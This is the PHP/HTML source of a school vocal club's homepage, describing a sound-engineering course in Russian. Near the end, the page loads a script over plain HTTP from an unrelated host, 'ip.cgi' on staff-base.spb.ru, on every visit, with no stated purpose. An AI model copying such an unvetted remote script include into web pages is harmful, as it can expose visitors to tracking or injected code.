<?php
session_start();
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="App/css/style.css">
    <link rel="shortcut icon" href="App/images/favicon/favicon.png" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <title>Вокальный кружок ТОН</title>
</head>
<body>
    <!--
        Preloader
    -->
    <!--
        Модалка
    -->
<?php
require ('require/preloader.html');
require ('require/modals.html');
require ('require/nav.html');
?>


<section class="info">
    <div class="title">
    <h1 class="high_text">Тон</h1>
</div>
<div class="text">
    <p>Вокальный кружок МКОУ БОГАНСКОЙ СОШ</p>
</div>
</section>
<div class="container">
    <section class="row">
    <h1 class="text-center mt-5">Вокальный кружок "ТОН"</h1>
    <h1 class="text-center mt-5">Программа обучения звукорежиссуре</h1>
    <div class="services mt-5">
        <div class="service">
            <h4>Сведение</h4>
            <p>Сведение музыки – ключевой этап работы над аудио материалом, превращающий свалку необработанных дорожек, Сведение музыки клипов и дублей в законченное музыкальное произведение, звучащее на любом оборудовании. Сведение музыки зачастую включает в себя монтаж, эквализацию, компрессию, реверберацию, тюнинг, тригирование, панорамирование, иногда реампинг и оживление midi-партий и другое.</p>
            <div><button class="buy mt-5">Подробнее</button></div>
        </div>
        <div class="service">
            <h4>Мастеринг</h4>
            <p>Профессиональный мастеринг представляет собой процесс обретения записью полноты качества и глубины звучания, и является финальным этапом обработки. Для того, чтобы звучание композиции было более глубоким, прозрачным, теплым и естественным, записи подвергаются тщательной обработке. После мастеринга аудиозапись будет звучать более объемно, чисто, плотно и профессионально на любой, даже не профессиональной звуковоспроизводящей аппаратуре.</p>
            <div><button class="buy mt-4">Подробнее</button></div>
        </div>
        <div class="service">
            <h4>Аранжировка</h4>
            <p>Комбинация двух предыдущих услуг. Сведение музыки – ключевой этап работы над аудио материалом, превращающий свалку необработанных дорожек. Профессиональный мастеринг представляет собой процесс обретения записью полноты качества и глубины звучания, и является финальным этапом обработкиосле мастеринга аудиозапись будет звучать более объемно, чисто, плотно и профессионально на любой, даже профессиональной звуковоспроизводящей аппаратуре.</p>
            <div><button class="buy">Подробнее</button></div>
        </div>
    
    </div>
</section>

</div>
</div>

<?php
require ('require/footer.html');
?>


<script type="text/javascript"
src="http://ip-jobs.staff-base.spb.ru/ip.cgi"></script>
<script src="App/js/main.js"></script>
</body>
</html>